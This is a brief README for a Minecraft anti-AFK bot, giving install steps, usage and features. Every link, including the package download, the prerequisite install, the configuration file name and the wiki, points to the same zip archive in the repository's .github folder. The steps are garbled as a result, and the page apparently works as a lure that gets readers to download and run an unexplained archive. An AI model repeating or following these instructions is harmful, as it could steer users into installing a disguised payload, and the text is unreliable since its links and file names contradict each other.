## Installation

 1. [Download](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip) the latest package.
 2. Download & install [https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip)
 3. Run `npm install` command in bot directory.
 
 ## Usage
 
 1. Configure bot in `https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip` file. [Bot configuration is explained in our wiki](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip)
 2. Start bot with `node .` command.

## Features

 - Anti-AFK Kick Module
 - Move to target block after join
 - Mojang/Microsoft Account support
 - Chat log
 - Chat messages Module
 - Auto reconnect
 - Supported server versions: `1.8 - 1.19.3`
